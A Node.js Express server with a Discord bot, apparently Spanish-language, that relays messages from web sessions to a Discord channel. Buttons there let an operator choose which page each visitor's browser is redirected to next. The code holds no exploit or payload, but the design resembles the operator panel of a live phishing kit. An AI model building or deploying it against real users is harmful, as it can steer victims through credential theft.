require("dotenv").config();

const express = require("express");
const cors = require("cors");
const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  REST,
  Routes,
} = require("discord.js");
const { ROUTES, BUTTONS } = require("./config/routes");

const PORT = Number(process.env.PORT) || 3000;
const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;

/** @type {Map<string, { redirect_to: string|null, messageId: string|null, lastActivity: number }>} */
const sessions = new Map();

/** @type {import('discord.js').Client|null} */
let discordClient = null;

function parseCorsOrigins() {
  const raw = process.env.CORS_ORIGINS || "*";
  if (raw.trim() === "*") return true;
  return raw.split(",").map((o) => o.trim()).filter(Boolean);
}

function buildControlRows(sessionId) {
  const styleMap = {
    1: ButtonStyle.Primary,
    2: ButtonStyle.Secondary,
    4: ButtonStyle.Danger,
  };

  const rows = [];
  let currentRow = new ActionRowBuilder();

  BUTTONS.forEach((btn, index) => {
    const customId = `ctrl:${sessionId}:${btn.action}`;
    const button = new ButtonBuilder()
      .setCustomId(customId)
      .setLabel(btn.label)
      .setStyle(styleMap[btn.style] || ButtonStyle.Primary);

    currentRow.addComponents(button);

    if (currentRow.components.length === 5 || index === BUTTONS.length - 1) {
      rows.push(currentRow);
      currentRow = new ActionRowBuilder();
    }
  });

  return rows;
}

async function sendOrUpdateControlMessage(sessionId, content, source = "sistema") {
  if (!discordClient || !CHANNEL_ID) {
    console.warn("[Discord] Bot o canal no configurado; omitiendo mensaje.");
    return null;
  }

  const channel = await discordClient.channels.fetch(CHANNEL_ID);
  if (!channel || !channel.isTextBased()) {
    throw new Error("Canal de Discord no válido o no es de texto.");
  }

  const embed = new EmbedBuilder()
    .setColor(0xda0081)
    .setTitle("Panel de control — entorno")
    .setDescription(content.slice(0, 4000))
    .addFields(
      { name: "Sesión", value: `\`${sessionId}\``, inline: false },
      { name: "Origen", value: source, inline: true },
      { name: "Estado", value: "Esperando acción…", inline: true }
    )
    .setTimestamp();

  const rows = buildControlRows(sessionId);
  const existing = sessions.get(sessionId);

  if (existing?.messageId) {
    try {
      const msg = await channel.messages.fetch(existing.messageId);
      await msg.edit({ embeds: [embed], components: rows });
      existing.lastActivity = Date.now();
      return existing.messageId;
    } catch {
      existing.messageId = null;
    }
  }

  const sent = await channel.send({ embeds: [embed], components: rows });
  sessions.set(sessionId, {
    redirect_to: existing?.redirect_to ?? null,
    messageId: sent.id,
    lastActivity: Date.now(),
  });
  return sent.id;
}

function setRedirect(sessionId, action) {
  const route = ROUTES[action];
  if (!route) return false;

  const entry = sessions.get(sessionId) || {
    redirect_to: null,
    messageId: null,
    lastActivity: Date.now(),
  };
  entry.redirect_to = route;
  entry.lastActivity = Date.now();
  sessions.set(sessionId, entry);
  return true;
}

async function startDiscordBot() {
  if (!TOKEN || !CLIENT_ID) {
    console.warn(
      "[Discord] DISCORD_BOT_TOKEN o DISCORD_CLIENT_ID no definidos. API activa sin bot."
    );
    return;
  }

  discordClient = new Client({
    intents: [GatewayIntentBits.Guilds],
  });

  discordClient.once("ready", async () => {
    console.log(`[Discord] Bot conectado como ${discordClient.user.tag}`);

    const rest = new REST({ version: "10" }).setToken(TOKEN);
    try {
      await rest.put(Routes.applicationCommands(CLIENT_ID), { body: [] });
    } catch (err) {
      console.warn("[Discord] No se pudieron limpiar comandos globales:", err.message);
    }
  });

  discordClient.on("interactionCreate", async (interaction) => {
    if (!interaction.isButton()) return;

    const parts = interaction.customId.split(":");
    if (parts[0] !== "ctrl" || parts.length < 3) return;

    const sessionId = parts[1];
    const action = parts.slice(2).join(":");

    if (!ROUTES[action]) {
      await interaction.reply({
        content: "Acción no reconocida.",
        ephemeral: true,
      });
      return;
    }

    setRedirect(sessionId, action);

    const route = ROUTES[action];
    await interaction.reply({
      content: `Redirigiendo entorno \`${sessionId}\` → **${route}**`,
      ephemeral: true,
    });

    if (interaction.message?.embeds?.[0]) {
      const embed = EmbedBuilder.from(interaction.message.embeds[0]).setFields(
        { name: "Sesión", value: `\`${sessionId}\``, inline: false },
        {
          name: "Última acción",
          value: `${BUTTONS.find((b) => b.action === action)?.label || action}`,
          inline: true,
        },
        { name: "Ruta", value: route, inline: true }
      );
      await interaction.message.edit({ embeds: [embed] }).catch(() => {});
    }
  });

  await discordClient.login(TOKEN);
}

function createApp() {
  const app = express();
  app.use(express.json({ limit: "32kb" }));
  app.use(
    cors({
      origin: parseCorsOrigins(),
      methods: ["GET", "POST", "OPTIONS"],
      allowedHeaders: ["Content-Type"],
    })
  );

  app.get("/health", (_req, res) => {
    res.json({
      ok: true,
      discord: Boolean(discordClient?.isReady()),
      sessions: sessions.size,
    });
  });

  app.post("/api/session/notify", async (req, res) => {
    try {
      const { sessionId, message, source } = req.body || {};

      if (!sessionId || typeof sessionId !== "string") {
        return res.status(400).json({ success: false, error: "sessionId requerido" });
      }

      const text =
        typeof message === "string" && message.trim()
          ? message.trim()
          : "Nueva actividad en el entorno controlado.";

      const src = typeof source === "string" ? source : "web";

      if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
          redirect_to: null,
          messageId: null,
          lastActivity: Date.now(),
        });
      } else {
        sessions.get(sessionId).lastActivity = Date.now();
      }

      await sendOrUpdateControlMessage(sessionId, text, src);

      res.json({ success: true, sessionId });
    } catch (err) {
      console.error("[API] notify:", err);
      res.status(500).json({ success: false, error: err.message });
    }
  });

  app.get("/api/redirect/get/:sessionId", (req, res) => {
    const { sessionId } = req.params;
    const entry = sessions.get(sessionId);

    if (!entry?.redirect_to) {
      return res.json({ success: false, redirect_to: null });
    }

    const redirect_to = entry.redirect_to;
    entry.redirect_to = null;
    entry.lastActivity = Date.now();

    res.json({ success: true, redirect_to });
  });

  app.post("/api/redirect/set", (req, res) => {
    const { sessionId, action } = req.body || {};

    if (!sessionId || !action) {
      return res.status(400).json({ success: false, error: "sessionId y action requeridos" });
    }

    if (!setRedirect(sessionId, action)) {
      return res.status(400).json({ success: false, error: "action no válida" });
    }

    res.json({ success: true, redirect_to: ROUTES[action] });
  });

  return app;
}

async function main() {
  const app = createApp();
  await startDiscordBot();

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[API] Servidor en puerto ${PORT}`);
    console.log("[API] Rutas: POST /api/session/notify, GET /api/redirect/get/:sessionId");
  });
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
